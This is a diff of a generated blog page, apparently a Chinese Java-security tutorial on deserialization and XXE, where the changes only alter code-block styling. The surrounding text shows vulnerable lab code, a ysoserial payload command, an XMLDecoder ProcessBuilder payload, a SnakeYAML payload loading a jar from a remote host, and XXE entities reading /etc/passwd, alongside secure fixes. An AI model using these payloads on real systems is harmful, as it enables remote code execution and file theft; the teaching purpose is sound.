-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span> <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Employee</span> <span style="color:#66d9ef">implements</span> java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">Serializable</span>{
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span> <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Employee</span> <span style="color:#66d9ef">implements</span> java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">Serializable</span>{
 </span></span><span style="display:flex;"><span> <span style="color:#66d9ef">public</span> String name;
 </span></span><span style="display:flex;"><span> <span style="color:#66d9ef">public</span> String address;
 </span></span><span style="display:flex;"><span> <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">transient</span> <span style="color:#66d9ef">int</span> age; <span style="color:#75715e">// transient瞬态修饰成员,不会被序列化</span>
@@ -2699,7 +2699,7 @@ java序列化的数据一般会以标记(ac ed 00 05)开头，base64编码的特
 </span></span><span style="display:flex;"><span> <span style="color:#75715e">//此处省略tostring等方法</span>
 </span></span><span style="display:flex;"><span> }
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SerializeDemo</span> {
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SerializeDemo</span> {
 </span></span><span style="display:flex;"><span> <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> IOException {
 </span></span><span style="display:flex;"><span>   Employee e <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Employee();
 </span></span><span style="display:flex;"><span>   e.<span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;zhangsan&#34;</span>;
@@ -2716,9 +2716,9 @@ java序列化的数据一般会以标记(ac ed 00 05)开头，base64编码的特
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><h3 id="objectinputstream">ObjectInputStream</h3>
 <p>如果能找到一个对象的class文件，我们可以进行反序列化操作，调用 ObjectInputStream 读取对象的方法</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ObjectInputStream.readObject<span style="color:#f92672">()</span>：任何类如果想要序列化必须实现java.io.Serializable接口
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ObjectInputStream.readObject<span style="color:#f92672">()</span>：任何类如果想要序列化必须实现java.io.Serializable接口
 </span></span></code></pre></div><h3 id="原生序列化类函数">原生序列化类函数</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-SnakeYaml：完整的YAML1.1规范Processor，支持Java对象的序列化/反序列化
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-SnakeYaml：完整的YAML1.1规范Processor，支持Java对象的序列化/反序列化
 </span></span><span style="display:flex;"><span>-XMLDecoder：xml语言格式序列化类函数接口
 </span></span><span style="display:flex;"><span>-ObjectInputStream.readObject<span style="color:#f92672">()</span>：任何类如果想要序列化必须实现java.io.Serializable接口
 </span></span></code></pre></div><h2 id="涉及工具">涉及工具</h2>
@@ -2728,7 +2728,7 @@ java序列化的数据一般会以标记(ac ed 00 05)开头，base64编码的特
 <li><a href="https://github.com/bewhale/JavaSec" target="_blank" rel="noopener nofollow noreferrer" >JavaSec</a></li>
 </ul>
 <p>利用工具,后面两个工具集成了第一个</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>https://github.com/frohoff/ysoserial
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>https://github.com/frohoff/ysoserial
 </span></span><span style="display:flex;"><span>Yakit https://yaklang.com/
 </span></span><span style="display:flex;"><span>https://github.com/NotSoSecure/SerializedPayloadGenerator
 </span></span></code></pre></div><h2 id="漏洞基本原理">漏洞基本原理</h2>
@@ -2738,20 +2738,20 @@ defaultReadObject方法为ObjectInputStream中执行readObject后的默认执行
 <p>运行流程：
 1.People对象序列化进object文件
 2.object文件反序列化对象-&gt;调用自身的readObject方法-&gt;执行Runtime.getRuntime().exec(&ldquo;calc.exe&rdquo;);</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">People</span>(String name, String sex, <span style="color:#66d9ef">int</span> age) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">People</span>(String name, String sex, <span style="color:#66d9ef">int</span> age) {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> name;
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">sex</span> <span style="color:#f92672">=</span> sex;
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">age</span> <span style="color:#f92672">=</span> age;
 </span></span><span style="display:flex;"><span>    }
 </span></span></code></pre></div><p>接着重写readObject方法.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readObject</span>(ObjectInputStream objInputStream) <span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readObject</span>(ObjectInputStream objInputStream) <span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {
 </span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 先调用默认的反序列化方法，即readObject</span>
 </span></span><span style="display:flex;"><span>        objInputStream.<span style="color:#a6e22e">defaultReadObject</span>();
 </span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 再执行自己的代码逻辑，例如执行系统命令</span>
 </span></span><span style="display:flex;"><span>        Runtime.<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;calc.exe&#34;</span>);
 </span></span><span style="display:flex;"><span>    }
 </span></span></code></pre></div><p>然后去进行序列化</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String <span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String <span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {
 </span></span><span style="display:flex;"><span>	People people <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> People(<span style="color:#e6db74">&#34;ZhangSan&#34;</span>, <span style="color:#e6db74">&#34;boy&#34;</span>, 18);
 </span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 先序列化People对象</span>
 </span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> byteStream <span style="color:#f92672">=</span> SerializeDemo.<span style="color:#a6e22e">Serialize</span>(people);
@@ -2768,7 +2768,7 @@ defaultReadObject方法为ObjectInputStream中执行readObject后的默认执行
 <h3 id="漏洞代码">漏洞代码</h3>
 <p>靶机平台上的</p>
 <h4 id="objectinputstream-1">ObjectInputStream</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// readObject，读取输入流,并转换对象。ObjectInputStream.readObject() 方法的作用正是从一个源输入流中读取字节序列，再把它们反序列化为一个对象。</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// readObject，读取输入流,并转换对象。ObjectInputStream.readObject() 方法的作用正是从一个源输入流中读取字节序列，再把它们反序列化为一个对象。</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// 生成payload：java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar CommonsCollections5 &#34;open -a Calculator&#34; | base64</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">cc</span>(String base64) {
@@ -2793,7 +2793,7 @@ defaultReadObject方法为ObjectInputStream中执行readObject后的默认执行
 </p>
 <h4 id="xmldecoder">XMLDecoder</h4>
 <p>也是一样的,只不过是换成了xmldecode.readObject</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// XMLDecoder在JDK 1.4~JDK 11中都存在反序列化漏洞安全风险。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。在项目中应禁止使用XMLDecoder方式解析XML内容</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// XMLDecoder在JDK 1.4~JDK 11中都存在反序列化漏洞安全风险。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。在项目中应禁止使用XMLDecoder方式解析XML内容</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>String path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;src/main/resources/payload/calc-1.xml&#34;</span>;
 </span></span><span style="display:flex;"><span>File file <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File(path);
@@ -2809,7 +2809,7 @@ defaultReadObject方法为ObjectInputStream中执行readObject后的默认执行
 </span></span><span style="display:flex;"><span>xmlDecoder.<span style="color:#a6e22e">readObject</span>();
 </span></span><span style="display:flex;"><span>xmlDecoder.<span style="color:#a6e22e">close</span>();
 </span></span></code></pre></div><p>传输的数据是xml格式</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;java</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;1.8.0_151&#34;</span> <span style="color:#a6e22e">class=</span><span style="color:#e6db74">&#34;java.beans.XMLDecoder&#34;</span><span style="color:#f92672">&gt;</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;object</span> <span style="color:#a6e22e">class=</span><span style="color:#e6db74">&#34;java.lang.ProcessBuilder&#34;</span><span style="color:#f92672">&gt;</span>
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;array</span> <span style="color:#a6e22e">class=</span><span style="color:#e6db74">&#34;java.lang.String&#34;</span> <span style="color:#a6e22e">length=</span><span style="color:#e6db74">&#34;3&#34;</span><span style="color:#f92672">&gt;</span>
@@ -2834,7 +2834,7 @@ defaultReadObject方法为ObjectInputStream中执行readObject后的默认执行
 <p>SnakeYAML 反序列化,
 SnakeYAML 在反序列化时可以指定 class 类型和构造方法的参数,
 结合 JDK 自带的 javax.script.ScriptEngineManager 类，可实现加载远程 jar 包，完成任意代码执行.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// 远程服务器支持用户可以输入yaml格式的内容并且进行数据解析，没有做沙箱，黑名单之类的防控</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// 远程服务器支持用户可以输入yaml格式的内容并且进行数据解析，没有做沙箱，黑名单之类的防控</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">yaml</span>(String content) {
 </span></span><span style="display:flex;"><span>    Yaml y <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Yaml();
@@ -2842,7 +2842,7 @@ SnakeYAML 在反序列化时可以指定 class 类型和构造方法的参数,
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>只不过传输的数据不是object格式了,而是yaml格式
 使用了<a href="https://github.com/artsploit/yaml-payload" target="_blank" rel="noopener nofollow noreferrer" >yaml-payload</a>这个工具,编译得到一个payload.jar,放在wsl里面,并且开一个web服务器.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#75715e">!!javax.script.ScriptEngineManager</span> [
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#75715e">!!javax.script.ScriptEngineManager</span> [
 </span></span><span style="display:flex;"><span>  <span style="color:#75715e">!!java.net.URLClassLoader</span> [[
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">!!java.net.URL</span> [<span style="color:#e6db74">&#34;http://192.168.10.7:8000/yaml-payload.jar&#34;</span>]
 </span></span><span style="display:flex;"><span>  ]]
@@ -2853,7 +2853,7 @@ SnakeYAML 在反序列化时可以指定 class 类型和构造方法的参数,
 </p>
 <h3 id="安全代码">安全代码</h3>
 <h4 id="黑白名单">黑白名单</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// 使用Apache Commons IO的ValidatingObjectInputStream，accept方法来实现反序列化类白/黑名单控制</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// 使用Apache Commons IO的ValidatingObjectInputStream，accept方法来实现反序列化类白/黑名单控制</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">safe</span>(String base64) {
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
@@ -2872,7 +2872,7 @@ SnakeYAML 在反序列化时可以指定 class 类型和构造方法的参数,
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> e.<span style="color:#a6e22e">toString</span>();
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><h4 id="snakeyaml安全构造器">SnakeYaml安全构造器</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// SafeConstructor 是 SnakeYaml 提供的一个安全的构造器。它可以用来构造安全的对象，避免反序列化漏洞的发生。</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// SafeConstructor 是 SnakeYaml 提供的一个安全的构造器。它可以用来构造安全的对象，避免反序列化漏洞的发生。</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">safe</span>(String content) {
 </span></span><span style="display:flex;"><span>    Yaml y <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Yaml(<span style="color:#66d9ef">new</span> SafeConstructor());
@@ -2951,7 +2951,7 @@ java序列化的数据一般会以标记(ac ed 00 05)开头，base64编码的特
 <li>处理指令,</li>
 </ul>
 <p>一个标准的xml文件为</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- XML文档声明；同时也是一个处理指令,用于声明 XML 文档的版本和编码方式。&lt;? xxx ?&gt; 就是处理指令的格式--&gt;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- XML文档声明；同时也是一个处理指令,用于声明 XML 文档的版本和编码方式。&lt;? xxx ?&gt; 就是处理指令的格式--&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- bookstore根元素、book子元素--&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;bookstore&gt;</span>
@@ -2995,7 +2995,7 @@ SYSTEM、PUBLIC是外部资源的申请</p>
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_2.png" alt="" /></figure>
 <p>使用&amp;xxe对上面定义的xxe实体进行了引用，到时候输出的时候&amp;xxe就会被“test”替换。</p></p>
 <p>在XML内部声明DTD:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE note [
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span>
 </span></span><span style="display:flex;"><span>  <span style="color:#75715e">&lt;!ELEMENT to      (#PCDATA)&gt;</span>
@@ -3009,7 +3009,7 @@ SYSTEM、PUBLIC是外部资源的申请</p>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/note&gt;</span>
 </span></span></code></pre></div><p>2）外部实体
 外部实体表示外部文件的内容，用 SYSTEM 关键词表示，通常使用下面的格式来引用</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY entityName SYSTEM &#34;fileName&#34;&gt;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY entityName SYSTEM &#34;fileName&#34;&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY example SYSTEM &#34;/etc/passwd&#34;&gt;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
@@ -3039,7 +3039,7 @@ XXE 攻击可能导致敏感信息泄露、服务拒绝（DoS）攻击等安全�
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_6.png" alt="|500" /><figcaption>|500</figcaption></figure>
 </p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE foo [  
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">  &lt;!ELEMENT foo ANY &gt;</span>
 </span></span><span style="display:flex;"><span>  <span style="color:#75715e">&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34; &gt;</span>]&gt;<span style="color:#f92672">&lt;foo&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/foo&gt;</span>
@@ -3080,7 +3080,7 @@ XXE 攻击可能导致敏感信息泄露、服务拒绝（DoS）攻击等安全�
 <h2 id="漏洞分析">漏洞分析</h2>
 <p>按照这两个平台提供的资源,来看看具体产生漏洞的代码.</p>
 <h3 id="xmlreader">XMLReader</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">/**
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * XMLReader 是一个接口，用于解析 XML 文档。它是 SAX (Simple API for XML) 的核心组件之一。
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 它提供了对 XML 文档的逐行读取和解析功能，并将事件传递给相应的处理器。
@@ -3105,7 +3105,7 @@ XXE 攻击可能导致敏感信息泄露、服务拒绝（DoS）攻击等安全�
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_2.png" alt="" /></figure>
 <p>修复方法就是上面代码中的,setFeature,禁用外部实体</p></p>
 <h3 id="saxparser">SAXParser</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">/**
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">/**
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * javax.xml.parsers.SAXParser 是 XMLReader 的替代品，它提供了更多的安全措施，
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 例如默认禁用 DTD 和外部实体的声明。如果需要使用 DTD 或外部实体，可以手动启用它们，
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 并使用相应的安全措施。
@@ -3129,7 +3129,7 @@ XXE 攻击可能导致敏感信息泄露、服务拒绝（DoS）攻击等安全�
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_8.png" alt="" /></figure>
 </p>
 <h3 id="saxreader">SAXReader</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">/**
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">/**
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * SAXReader 是一个用于读取和解析 XML 文档的类。它基于 SAX (Simple API for XML) 实现，
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 提供了简单的 API 以便快速解析 XML。SAXReader 通常用于处理大规模 XML 数据流。
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 在使用 SAXReader 时，需要采取相应的安全措施来防止 XML 外部实体注入等攻击。
@@ -3149,7 +3149,7 @@ XXE 攻击可能导致敏感信息泄露、服务拒绝（DoS）攻击等安全�
 </span></span><span style="display:flex;"><span>	}
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><h3 id="saxbuilder">SAXBuilder</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">/**
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">/**
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * SAXBuilder 是一个用于构建 JDOM (Java Document Object Model) 文档的类。
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 它基于 SAX 解析器，将 XML 数据解析为 JDOM 文档对象。SAXBuilder 提供了易于使用的 API，
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 使得在内存中操作 XML 文档更加方便。在使用 SAXBuilder 时，应确保配置正确的安全设置，
@@ -3168,7 +3168,7 @@ XXE 攻击可能导致敏感信息泄露、服务拒绝（DoS）攻击等安全�
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><h3 id="documentbuilder">DocumentBuilder</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">/**
